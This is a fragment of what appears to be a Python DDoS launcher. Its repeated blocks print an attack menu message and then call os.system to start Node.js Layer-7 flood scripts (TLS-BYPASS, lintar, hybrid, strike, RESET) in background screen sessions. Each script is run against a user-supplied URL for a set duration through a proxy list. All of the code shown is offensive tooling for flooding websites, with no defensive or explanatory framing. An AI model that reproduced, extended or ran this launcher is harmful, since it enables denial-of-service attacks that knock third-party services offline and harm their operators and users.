...
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node TLS-BYPASS.js {url} {duration} 64 2 proxy.txt')
...
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node lintar.js {url} {duration} 64 2 proxy.txt')
...
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node hybrid.js {url} {duration} 64 2 proxy.txt')
...
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node strike.js POST {url} {duration} 2 64 proxy.txt')
...
\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
                    os.system(f'cd l7 && screen -dm node RESET.js {url} {duration} 64 2 proxy.txt')
